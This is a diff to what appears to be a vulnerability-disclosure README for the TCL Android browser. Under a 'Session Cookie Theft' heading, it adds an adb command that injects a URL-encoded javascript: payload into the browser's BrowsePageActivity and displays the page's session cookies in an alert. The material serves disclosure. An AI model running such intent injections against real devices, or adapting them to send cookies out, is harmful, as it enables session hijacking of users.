@@ -59,11 +59,13 @@ Google.com
 ![image](https://github.com/actuator/com.tcl.browser/blob/main/Gmail.gif)
 
 Session Cookie Theft: 
+
+
+
+```
+adb shell am start -a android.intent.action.VIEW -d 'javascript:(function()%7Balert(%27Session%20Cookies%3A%20%27%20%2B%20document.cookie)%3B%7D)()' com.tcl.browser/com.tcl.browser.portal.browse.activity.BrowsePageActivity
+```
 ![image](https://github.com/actuator/com.tcl.browser/blob/main/cookie.gif)
-
-
-
-
 
 
 ---
